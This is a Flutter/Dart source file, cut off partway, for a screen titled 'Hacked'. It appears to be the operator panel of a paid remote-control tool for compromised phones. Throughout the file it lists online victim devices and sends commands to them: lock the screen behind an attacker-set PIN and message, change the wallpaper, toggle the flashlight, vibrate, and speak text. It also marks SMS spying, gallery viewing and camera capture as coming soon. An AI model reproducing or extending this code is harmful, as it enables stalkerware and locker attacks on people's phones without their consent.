import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:image_picker/image_picker.dart';
import 'package:file_picker/file_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../utils/theme.dart';
import '../utils/app_localizations.dart';
import '../services/api_service.dart';

class HackedScreen extends StatefulWidget {
  const HackedScreen({super.key});

  @override
  State<HackedScreen> createState() => _HackedScreenState();
}

class _HackedScreenState extends State<HackedScreen>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;

  String _role = '';
  List<Map<String, dynamic>> _devices = [];
  bool _loadingDevices = false;
  String? _selectedDeviceId;
  String? _selectedDeviceName;

  final _lockTextCtrl = TextEditingController();
  final _pinCtrl      = TextEditingController();
  bool _sendingCmd    = false;
  bool _flashOn       = false;

  // PSKNMRC
  final _psknmrcUsernameCtrl = TextEditingController();
  bool _creatingPsknmrc      = false;
  String _psknmrcMsg         = '';

  Timer? _pollTimer;

  static const _purple = Color(0xFF8B5CF6);
  static const _gold   = Color(0xFFFFD700);

  List<Map<String, dynamic>> get _hackedCommands => [
    {'icon': AppSvgIcons.lock,      'title': tr('lock_device'),     'color': const Color(0xFFEF4444), 'cmd': 'lock',        'active': true},
    {'icon': AppSvgIcons.unlock,    'title': tr('unlock_device'),   'color': const Color(0xFF10B981), 'cmd': 'unlock',      'active': true},
    {'icon': AppSvgIcons.flashlight,'title': tr('hack_flashlight'), 'color': const Color(0xFFFFD700), 'cmd': 'flashlight',  'active': true},
    {'icon': AppSvgIcons.image,     'title': tr('hack_wallpaper'),  'color': const Color(0xFFFF6B35), 'cmd': 'wallpaper',   'active': true},
    {'icon': AppSvgIcons.vibrate,   'title': tr('vibrate_device'),  'color': const Color(0xFF8B5CF6), 'cmd': 'vibrate',     'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 18.5a6.5 6.5 0 1 0 0-13 6.5 6.5 0 0 0 0 13z"/><path d="M12 14a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"/><path d="M12 8V5m0 14v-3M8 12H5m14 0h-3"/></svg>', 'title': 'Text To Speech', 'color': const Color(0xFF06B6D4), 'cmd': 'tts', 'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>', 'title': 'Play Sound', 'color': const Color(0xFF10B981), 'cmd': 'sound', 'active': true},
    {'icon': AppSvgIcons.gallery,   'title': tr('view_gallery'),    'color': const Color(0xFF06B6D4), 'cmd': 'gallery',     'active': false},
    {'icon': AppSvgIcons.sms,       'title': tr('spyware_sms'),     'color': const Color(0xFFEF4444), 'cmd': 'sms',         'active': false},
    {'icon': AppSvgIcons.camera,    'title': tr('take_photo'),      'color': const Color(0xFF3B82F6), 'cmd': 'camera',      'active': false},
  ];

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 3, vsync: this);
    _loadRole();
    _loadDevices();
    _pollTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      if (mounted) _loadDevices();
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    _pollTimer?.cancel();
    _lockTextCtrl.dispose();
    _pinCtrl.dispose();
    _psknmrcUsernameCtrl.dispose();
    super.dispose();
  }

  Future<void> _loadRole() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() => _role = prefs.getString('role') ?? '');
  }

  Future<void> _loadDevices() async {
    if (_loadingDevices) return;
    _loadingDevices = true;
    try {
      final res = await ApiService.get('/api/hacked/devices');
      if (res['success'] == true && mounted) {
        final newDevices = List<Map<String, dynamic>>.from(res['devices'] ?? []);
        String? newSelectedId   = _selectedDeviceId;
        String? newSelectedName = _selectedDeviceName;
        if (_selectedDeviceId != null) {
          final sel = newDevices.firstWhere(
            (d) => d['deviceId'] == _selectedDeviceId,
            orElse: () => {},
          );
          if (sel.isEmpty) { newSelectedId = null; newSelectedName = null; }
        }
        setState(() {
          _devices           = newDevices;
          _selectedDeviceId  = newSelectedId;
          _selectedDeviceName = newSelectedName;
        });
      }
    } catch (_) {}
    _loadingDevices = false;
  }

  Future<void> _sendCommand(String type, Map<String, dynamic> payload) async {
    if (_selectedDeviceId == null) {
      _snack(tr('select_device_first'), isError: true);
      return;
    }
    setState(() => _sendingCmd = true);
    try {
      final res = await ApiService.post('/api/hacked/command', {
        'deviceId': _selectedDeviceId,
        'type': type,
        'payload': payload,
      });
      _snack(res['message'] ?? (res['success'] == true ? 'Command Terkirim' : 'Gagal'));
    } catch (e) {
      _snack('Error: $e', isError: true);
    }
    if (mounted) setState(() => _sendingCmd = false);
  }

  void _handleCommandTap(Map<String, dynamic> cmd) {
    final isActive = cmd['active'] as bool;
    final type     = cmd['cmd']   as String;
    final title    = cmd['title'] as String;
    if (!isActive) { _showComingSoon(title); return; }
    switch (type) {
      case 'lock':        _showLockDialog(); break;
      case 'unlock':      _sendCommand('unlock', {}); break;
      case 'flashlight':
        final next = !_flashOn;
        _sendCommand('flashlight', {'state': next ? 'on' : 'off'}).then((_) {
          if (mounted) setState(() => _flashOn = next);
        });
        break;
      case 'wallpaper':
        _showWallpaperDialog();
        break;
      case 'vibrate':
        _showVibrateDialog();
        break;
      case 'tts':
        _showTtsDialog();
        break;
      case 'sound':
        _showSoundDialog();
        break;
    }
  }


  void _showWallpaperDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _WallpaperSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSent: (msg) => _snack(msg),
        onError: (msg) => _snack(msg, isError: true),
      ),
    );
  }

  void _showVibrateDialog() {
    String selectedPattern = 'single';
    int durationSec = 2;
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setS) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: _purple.withOpacity(0.3))),
            padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _purple.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.4))),
                  child: const Center(child: Icon(Icons.vibration_rounded, color: _purple, size: 18))),
                const SizedBox(width: 12),
                const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text('GETAR DEVICE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Pilih pola getaran', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF8B5CF6))),
                ]),
            ]),
            const SizedBox(height: 20),
            Text('POLA GETARAN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
            const SizedBox(height: 10),
            ...[
              {'value': 'single', 'label': 'Single (1x)', 'desc': 'Getar sekali'},
              {'value': 'double', 'label': 'Double (2x)', 'desc': 'Getar dua kali'},
              {'value': 'sos',    'label': 'SOS Pattern', 'desc': '... --- ...'},
            ].map((p) => GestureDetector(
              onTap: () => setS(() => selectedPattern = p['value']!),
              child: Container(
                margin: const EdgeInsets.only(bottom: 8),
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                decoration: BoxDecoration(
                  color: selectedPattern == p['value'] ? _purple.withOpacity(0.2) : const Color(0xFF071525),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: selectedPattern == p['value'] ? _purple : _purple.withOpacity(0.2))),
                child: Row(children: [
                  Container(width: 16, height: 16,
                    decoration: BoxDecoration(shape: BoxShape.circle,
                      color: selectedPattern == p['value'] ? _purple : Colors.transparent,
                      border: Border.all(color: _purple))),
                  const SizedBox(width: 12),
                  Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text(p['label']!, style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: Colors.white)),
                    Text(p['desc']!, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white.withOpacity(0.5))),
                  ]),
                ]),
              ),
            )),
            if (selectedPattern == 'single') ...[
              const SizedBox(height: 8),
              Text('DURASI: ${durationSec}s', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
              Slider(
                value: durationSec.toDouble(), min: 1, max: 10, divisions: 9,
                activeColor: _purple,
                onChanged: (v) => setS(() => durationSec = v.round()),
              ),
            ],
            const SizedBox(height: 16),
            Row(children: [
              Expanded(child: GestureDetector(
                onTap: () => Navigator.pop(ctx),
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                  child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))),
              )),
              const SizedBox(width: 12),
              Expanded(child: GestureDetector(
                onTap: () {
                  Navigator.pop(ctx);
                  _sendCommand('vibrate', {'pattern': selectedPattern, 'duration': durationSec * 1000});
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(12)),
                  child: const Center(child: Text('GETAR!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))),
              )),
            ]),
          ]),
        ), // end Container
        ), // end Padding
      ),
    );
  }

  void _showTtsDialog() {
    final textCtrl = TextEditingController();
    String selectedLang = 'id';
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setS) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.3))),
            padding: const EdgeInsets.all(24),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(color: const Color(0xFF06B6D4).withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: const Color(0xFF06B6D4).withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.4))),
                  child: const Center(child: Icon(Icons.record_voice_over_rounded, color: Color(0xFF06B6D4), size: 18))),
                const SizedBox(width: 12),
                const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text('TEXT TO SPEECH', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Device akan berbicara keras', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF06B6D4))),
                ]),
              ]),
              const SizedBox(height: 20),
              Text('BAHASA', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: const Color(0xFF06B6D4).withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 8),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => setS(() => selectedLang = 'id'),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: selectedLang == 'id' ? const Color(0xFF06B6D4).withOpacity(0.2) : const Color(0xFF071525),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: selectedLang == 'id' ? const Color(0xFF06B6D4) : const Color(0xFF06B6D4).withOpacity(0.2))),
                    child: const Center(child: Text('🇮🇩 Indonesia', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)))),
                )),
                const SizedBox(width: 10),
                Expanded(child: GestureDetector(
                  onTap: () => setS(() => selectedLang = 'en'),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: selectedLang == 'en' ? const Color(0xFF06B6D4).withOpacity(0.2) : const Color(0xFF071525),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: selectedLang == 'en' ? const Color(0xFF06B6D4) : const Color(0xFF06B6D4).withOpacity(0.2))),
                    child: const Center(child: Text('🇬🇧 English', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)))),
                )),
              ]),
              const SizedBox(height: 16),
              Text('TEKS YANG AKAN DIBACAKAN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: const Color(0xFF06B6D4).withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.3))),
                child: TextField(
                  controller: textCtrl,
                  maxLines: 3,
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                  decoration: InputDecoration(
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.all(14),
                    hintText: 'Masukkan teks yang akan diucapkan device...',
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 11, fontFamily: 'ShareTechMono')),
                ),
              ),
              const SizedBox(height: 16),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => Navigator.pop(ctx),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                    child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))),
                )),
                const SizedBox(width: 12),
                Expanded(child: GestureDetector(
                  onTap: () {
                    final text = textCtrl.text.trim();
                    if (text.isEmpty) { _snack('Teks tidak boleh kosong', isError: true); return; }
                    Navigator.pop(ctx);
                    _sendCommand('tts', {'text': text, 'lang': selectedLang});
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      gradient: const LinearGradient(colors: [Color(0xFF06B6D4), Color(0xFF0891B2)]),
                      borderRadius: BorderRadius.circular(12)),
                    child: const Center(child: Text('BICARAKAN!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))),
                )),
              ]),
              const SizedBox(height: 8),
            ]),
          ),
        ),
      ),
    );
  }

  void _showSoundDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _SoundSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSent: (msg) => _snack(msg),
        onError: (msg) => _snack(msg, isError: true),
      ),
    );
  }

  void _showComingSoon(String title) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: _purple.withOpacity(0.5))),
        title: Row(children: [
          Container(width: 3, height: 18,
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]),
              borderRadius: BorderRadius.circular(2))),
          SizedBox(width: 10),
          Flexible(child: Text(title.toUpperCase(), style: const TextStyle(
              fontFamily: 'Orbitron', color: Colors.white, fontSize: 13, letterSpacing: 1.5))),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: _purple.withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _purple.withOpacity(0.3))),
            child: Column(children: [
              SvgPicture.string(AppSvgIcons.zap, width: 36, height: 36,
                colorFilter: ColorFilter.mode(Colors.orange.withOpacity(0.8), BlendMode.srcIn)),
              SizedBox(height: 12),
              Text(tr('coming_soon'), style: const TextStyle(fontFamily: 'Orbitron',
                  fontSize: 14, color: Colors.orange, letterSpacing: 2, fontWeight: FontWeight.bold)),
              SizedBox(height: 8),
              Text(tr('coming_soon_body'),
                textAlign: TextAlign.center,
                style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11,
                    color: AppTheme.textMuted, height: 1.6)),
            ])),
        ]),
        actions: [
          Container(
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]),
              borderRadius: BorderRadius.circular(8)),
            child: TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('Ok', style: TextStyle(fontFamily: 'Orbitron',
                  color: Colors.white, fontSize: 11, letterSpacing: 1)))),
        ],
      ),
    );
  }

  void _showLockDialog() {
    _lockTextCtrl.clear();
    _pinCtrl.clear();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setSheetState) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: _purple.withOpacity(0.3)),
            ),
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Handle bar
                Center(child: Container(width: 40, height: 4,
                  decoration: BoxDecoration(
                    color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
                const SizedBox(height: 20),

                // Title
                Row(children: [
                  Container(width: 36, height: 36,
                    decoration: BoxDecoration(
                      color: _purple.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _purple.withOpacity(0.4))),
                    child: Center(child: SvgPicture.string(AppSvgIcons.lock, width: 18, height: 18,
                        colorFilter: const ColorFilter.mode(_purple, BlendMode.srcIn)))),
                  const SizedBox(width: 12),
                  Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text(tr('lock_device'),
                      style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14,
                        fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                    Text(tr('lock_text_hint'),
                      style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10,
                        color: AppTheme.textMuted.withOpacity(0.7))),
                  ]),
                ]),
                const SizedBox(height: 20),

                // Pesan lock screen
                Text('PESAN LOCK SCREEN',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10,
                    color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
                const SizedBox(height: 6),
                Container(
                  decoration: BoxDecoration(
                    color: const Color(0xFF071525),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _purple.withOpacity(0.3))),
                  child: TextField(
                    controller: _lockTextCtrl,
                    maxLines: 3,
                    style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                    decoration: InputDecoration(
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.all(14),
                      hintText: 'Masukkan pesan yang akan ditampilkan di lock screen...',
                      hintStyle: TextStyle(color: AppTheme.textMuted.withOpacity(0.4),
                        fontSize: 11, fontFamily: 'ShareTechMono')),
                  ),
                ),
                const SizedBox(height: 16),

                // PIN
                Text('PIN UNLOCK (4-8 DIGIT)',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10,
                    color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
                const SizedBox(height: 6),
                Container(
                  decoration: BoxDecoration(
                    color: const Color(0xFF071525),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _purple.withOpacity(0.3))),
                  child: TextField(
                    controller: _pinCtrl,
                    keyboardType: TextInputType.number,
                    maxLength: 8,
                    textAlign: TextAlign.center,
                    style: const TextStyle(
                      fontFamily: 'Orbitron', color: _purple,
                      fontSize: 24, letterSpacing: 12, fontWeight: FontWeight.bold),
                    decoration: InputDecoration(
                      border: InputBorder.none,
                      counterText: '',
                      contentPadding: const EdgeInsets.symmetric(vertical: 16),
                      hintText: '••••',
                      hintStyle: TextStyle(color: _purple.withOpacity(0.3),
                        fontSize: 24, letterSpacing: 12, fontFamily: 'Orbitron')),
                  ),
                ),
                const SizedBox(height: 8),
                // Keypad hint
                Center(child: Text('Tekan angka untuk memasukkan PIN',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
                    color: AppTheme.textMuted.withOpacity(0.5)))),
                const SizedBox(height: 20),

                // Buttons
                Row(children: [
                  Expanded(
                    child: GestureDetector(
                      onTap: () => Navigator.pop(ctx),
                      child: Container(
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: Colors.white.withOpacity(0.15))),
                        child: Center(child: Text(tr('cancel'),
                          style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12,
                            color: Colors.white70, letterSpacing: 1))),
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: GestureDetector(
                      onTap: () async {
                        final txt = _lockTextCtrl.text.trim();
                        final pin = _pinCtrl.text.trim();
                        if (pin.isEmpty) { _snack('PIN Wajib Diisi', isError: true); return; }
                        Navigator.pop(ctx);
                        await _sendCommand('lock', {'text': txt, 'pin': pin});
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        decoration: BoxDecoration(
                          gradient: const LinearGradient(
                            colors: [_purple, Color(0xFF6D28D9)]),
                          borderRadius: BorderRadius.circular(12)),
                        child: Center(child: Text(tr('lock_btn'),
                          style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12,
                            fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1))),
                      ),
                    ),
                  ),
                ]),
                const SizedBox(height: 8),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _snack(String msg, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11)),
      backgroundColor: isError ? Colors.red.shade900 : _purple,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final allowed = _role == 'vip' || _role == 'owner' || _role == 'premium';

    return ListenableBuilder(
      listenable: AppLocalizations.instance,
      builder: (context, _) => Scaffold(
        backgroundColor: AppTheme.darkBg,
        appBar: AppBar(
          backgroundColor: AppTheme.darkBg,
          elevation: 0,
          leading: GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              margin: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                border: Border.all(color: _purple.withOpacity(0.4)),
                borderRadius: BorderRadius.circular(10)),
              child: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white, size: 16))),
          title: Row(children: [
            Container(width: 3, height: 18,
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]),
                borderRadius: BorderRadius.circular(2))),
            SizedBox(width: 10),
            Text(tr('hacked_title'), style: const TextStyle(fontFamily: 'Orbitron',
                fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 2)),
            SizedBox(width: 8),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
              decoration: BoxDecoration(
                color: _gold.withOpacity(0.15),
                borderRadius: BorderRadius.circular(4),
                border: Border.all(color: _gold.withOpacity(0.5))),
              child: const Text('VIP', style: TextStyle(fontFamily: 'ShareTechMono',
                  fontSize: 8, color: _gold, letterSpacing: 1))),
          ]),
          bottom: allowed ? TabBar(
            controller: _tabController,
            indicatorColor: _purple,
            indicatorWeight: 2.5,
            labelStyle: const TextStyle(fontFamily: 'Orbitron', fontSize: 10,
                fontWeight: FontWeight.bold, letterSpacing: 1.5),
            unselectedLabelStyle: const TextStyle(fontFamily: 'Orbitron', fontSize: 10,
                letterSpacing: 1.5),
            labelColor: _purple,
            unselectedLabelColor: AppTheme.textMuted,
            dividerColor: _purple.withOpacity(0.2),
            tabs: [
              Tab(text: tr('tab_device_connect')),
              Tab(text: tr('tab_hack_command')),
              const Tab(text: 'USERS'),
            ],
          ) : PreferredSize(
            preferredSize: const Size.fromHeight(1),
            child: Container(height: 1, color: _purple.withOpacity(0.25)),
          ),
        ),
        body: !allowed
            ? _buildNoAccess()
            : TabBarView(
                controller: _tabController,
                children: [
                  _buildDeviceConnectTab(),
                  _buildHackCommandTab(),
                  _buildPsknmrcTab(),
                ],
              ),
      ),
    );
  }

  // ─── TAB 1: DEVICE CONNECT ───
  Widget _buildDeviceConnectTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _buildSectionLabel(tr('select_device')),
        SizedBox(height: 12),
        _buildDeviceSelector(),
        SizedBox(height: 60),
      ]),
    );
  }

  Widget _buildHackCommandTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _buildSectionLabel(tr('hacked_commands')),
        SizedBox(height: 4),
        if (_selectedDeviceId == null)
          Padding(
            padding: const EdgeInsets.only(bottom: 8, left: 11),
            child: Text(tr('select_device_first'),
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10,
                  color: AppTheme.textMuted.withOpacity(0.6)))),
        SizedBox(height: 12),
        _buildCommandGrid(),
        SizedBox(height: 60),
      ]),
    );
  }

  Widget _buildNoAccess() {
    return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      SvgPicture.string(AppSvgIcons.lock, width: 56, height: 56,
        colorFilter: ColorFilter.mode(Colors.red.withOpacity(0.4), BlendMode.srcIn)),
      SizedBox(height: 16),
      Text(tr('no_access'), style: const TextStyle(fontFamily: 'Orbitron',
          fontSize: 16, color: Colors.red, letterSpacing: 3)),
      SizedBox(height: 8),
      Text(tr('vip_only'),
        textAlign: TextAlign.center,
        style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12,
            color: AppTheme.textMuted, height: 1.6)),
    ]));
  }

  Widget _buildSectionLabel(String t) {
    return Row(children: [
      Container(width: 3, height: 14,
        decoration: BoxDecoration(
          gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]),
          borderRadius: BorderRadius.circular(2))),
      SizedBox(width: 8),
      Text(t, style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11,
          color: _purple, letterSpacing: 2)),
    ]);
  }

  Widget _buildDeviceSelector() {
    final onlineDevices = _devices.where((d) => d['online'] == true).toList();
    if (onlineDevices.isEmpty) {
      return Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: AppTheme.cardBg, borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _purple.withOpacity(0.2))),
        child: Column(children: [
          SvgPicture.string(AppSvgIcons.mobile, width: 32, height: 32,
            colorFilter: ColorFilter.mode(_purple.withOpacity(0.3), BlendMode.srcIn)),
          SizedBox(height: 12),
          Text(tr('no_device_online'), style: const TextStyle(fontFamily: 'Orbitron',
              fontSize: 11, color: AppTheme.textMuted, letterSpacing: 1)),
          SizedBox(height: 4),
          Text(tr('device_hint'),
            textAlign: TextAlign.center,
            style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10,
                color: AppTheme.textMuted, height: 1.5)),
          SizedBox(height: 12),
          GestureDetector(
            onTap: _loadDevices,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              decoration: BoxDecoration(
                border: Border.all(color: _purple.withOpacity(0.4)),
                borderRadius: BorderRadius.circular(8)),
              child: const Text('Refresh', style: TextStyle(fontFamily: 'Orbitron',
                  fontSize: 10, color: _purple, letterSpacing: 1)))),
        ]),
      );
    }

    return Column(
      children: onlineDevices.map((d) {
        final isSelected = _selectedDeviceId == d['deviceId'];
        return GestureDetector(
          onTap: () => setState(() {
            _selectedDeviceId   = d['deviceId']   as String;
            _selectedDeviceName = d['deviceName'] as String;
            _flashOn = false;
          }),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            margin: const EdgeInsets.only(bottom: 10),
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: isSelected ? _purple.withOpacity(0.15) : AppTheme.cardBg,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: isSelected ? _purple : _purple.withOpacity(0.2),
                width: isSelected ? 1.5 : 1),
